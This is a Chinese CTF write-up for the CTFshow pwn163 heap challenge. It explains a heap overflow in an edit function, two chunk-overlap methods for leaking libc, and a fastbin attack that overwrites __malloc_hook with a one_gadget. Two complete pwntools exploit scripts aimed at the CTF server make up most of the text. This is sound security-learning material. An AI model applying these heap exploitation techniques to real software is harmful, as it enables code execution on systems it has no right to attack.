---
title: CTFshow pwn163
tags:
    - pwn
    - 堆块重叠
categories:
    - 做题笔记
cover: /img/嘿猫猫.png
---
# CTFshow pwn163（堆块重叠|fastbin ）
## 前言
​        这两天在看IO_FILE 的相关利用，实在是给我看晕了。各种house of 确实有点东西。但是到最后发现自己的基础还是不够，除了fastbins 和 unsorted bins 稍微了解一点。其他的机制可以说是一坨。回来写点题，补一下基础。然后在结合这些基本的手法，去看高级的利用链。这个就是利用堆的布局，去达到我们的目的。或许也可以叫堆风水。
​        突然觉得堆风水这个名字起得太好了，主要可以自己构造布局，为我所控。真有一种**盖周天之变，化吾为王** 的感觉。

## ida分析
### edit函数
![image-20250529222118413](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250529222118413.png)
1.其他函数没有漏洞。只有edit，对size 没有检查，可以溢出。
2.在它的heaplist上会设置标志位检查这个堆块是否被free。
3.show的时候，会根据add时的size 进行打印内容。
4.add是采用calloc分配空间，初始化都为1。
5.free会把指针置空，size置0，标志置0。
6.并且，这是一道保护机制全开的题目。

## 思路分析
1.首先第一点是要泄露libc。由于保护机制全开，无法修改got表，同时程序的基地址无法获取。所以unlink的手段失效。显然是需要去修改hook。泄露libc的手段，是通过main_arena,也就是通过unsorted bins 中的堆块。由于add 会对堆块里的数据破坏，所以只能在堆块处于free 状态下打印。可是题目没有uaf 的漏洞，所以要让一个堆块又处于free 又处于 used 状态下。
2.如何构造呢？在这里提供两种思路。第一种思路：我们通过两个大小相同为size ，且地址连续的unsorted bin 的chunk来构造一个重叠。通过溢出，将第一个堆块的大小，修改为两个堆块的大小。然后free掉第一个堆块。此时libc会认为，第一个堆块的大小是2*size，所以实际上libc会把两个堆块的空间都放入unsorted bins中。此时再申清，size大小的堆块，就可以把第一个堆块申请出来，并且会把main_arena+0x58 写入到第二个堆块中去。此时只要show就可以拿到信息了；第二种思路，是通过fastbin ，把已经分配的空间再分配，来完成的。首先将小堆块free 放入fastbins，然后通过溢出修改其fd指针，指向目标unsorted bin 的chunk，通过两次add，把这块空间再分配，那么两个指针指向同一块空间了。之后free 大堆块，将其放入unsorted bin中，再show 小堆块，就可以拿到信息了。
3.拿到libc的信息之后，稍加计算得到malloc_hook 和 relloc的地址。然后就是fastbin dup 。在这里，本地打通之后，思路就是没问题的。但是远程会出现打不通的情况。原因是ibc版本不同所造成的偏移不一样。因此libcbase，one_gadget ，等地址可能会不一样。所以要打通远程得有正确的偏移。

## exp
### 思路一
```python
from esy import *
context.log_level='debug'
context.terminal=['tmux','splitw','-h','-l','66%']
io,elf=loadfile("pwn","pwn.challenge.ctf.show",28248)
libc=ELF("/home/tsq/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6")

def add(size):
    io.sendlineafter("Command: ",str(1))
    io.sendlineafter("Size: ",str(size))

def edit(idx,size,content):
    io.sendlineafter("Command: ",str(2))
    io.sendlineafter("Index: ",str(idx))
    io.sendlineafter("Size: ",str(size))
    io.sendafter("Content: ",content)

def free(idx):
    io.sendlineafter("Command: ",str(3))
    io.sendlineafter("Index: ",str(idx))

def show(idx):
    io.sendlineafter("Command: ",str(4))
    io.sendlineafter("Index: ",str(idx))

add(0x20) # 0  全责哥
add(0x68) # 1  半责哥
add(0x80) # 2  堆块重叠
add(0x80) # 3  被重叠了
add(0x80) # 4  
add(0x20) # 5

edit(1,0x6a,b'\x41'*0x68+b'\x21\x01')
free(2)
add(0x80) # 2
show(3)
io.recv(0x12)
#libcbase=u64(io.recv(6).ljust(8,b'\x00'))-0x3c3b78
libcbase=u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-0x3c4b78
logvalue("libcbase",hex(libcbase))
malloc_hook=libcbase+0x3c4b10
realloc=libcbase+0x846c0
logvalue("malloc_hook",hex(malloc_hook))
one_gadget=libcbase+0x4526a
add(0x80) # 3
free(1)

edit(0,0x38,p64(0)*5+p64(0x71)+p64(malloc_hook-0x23))
add(0x68) # 1
add(0x68) # 6
#gdb.attach(io)
payload=b'\x00'*0xb+p64(one_gadget)+p64(realloc+8)
edit(7,len(payload),payload)
io.sendlineafter("Command: ",str(1))
io.sendlineafter("Size: ",str(0x68))

io.interactive()
```
### 思路二
懒得写了，直接那官方的题解了
```python
from pwn import *
context(arch='amd64',os='linux',log_level='debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28145)
elf = ELF('./pwn')
libc = ELF('/home/bit/libc/64bit/libc-2.23.so')
    
def Alloc(size):
    io.recvuntil('Command:')
    io.sendline('1')
    io.recvuntil('Size:')
    io.sendline(str(size))
    
def Fill(index,content):
    io.recvuntil('Command:')
    io.sendline('2')
    io.recvuntil('Index:')
    io.sendline(str(index))
    io.recvuntil('Size:')
    io.sendline(str(len(content)))
    io.recvuntil('Content:')
    io.send(content)
    
def Free(index):
    io.recvuntil('Command:')
    io.sendline('3')
    io.recvuntil('Index:')
    io.sendline(str(index))
    
def Dump(index):
    io.recvuntil('Command:')
    io.sendline('4')
    io.recvuntil('Index:')
    io.sendline(str(index))
    io.recvuntil('Content: \n')
    A = io.recvline()
    return A

Alloc(0x10)
Alloc(0x10)
Alloc(0x10)
Alloc(0x10)
Alloc(0x80)
Free(1)
Free(2)
padding = p64(0)*3 + p64(0x21)
payload = padding*2 + p8(0x80)
Fill(0, payload)
Fill(3, padding)
Alloc(0x10)
Alloc(0x10)

payload = p64(0)*3 + p64(0x91)
Fill(3, payload)
Alloc(0x80)
Free(4)
libc_base = u64(Dump(2)[:8].ljust(8, "\x00"))-0x3c4b78
print(hex(libc_base))
    
Alloc(0x60)
Free(4)
payload = p64(libc_base + 0x3c4aed)
Fill(2, payload)
Alloc(0x60)
Alloc(0x60)
one = libc_base + 0x4526a
payload = p8(0)*3 + p64(0)*2 + p64(one)
Fill(6, payload)
Alloc(0x10)

io.interactive()
```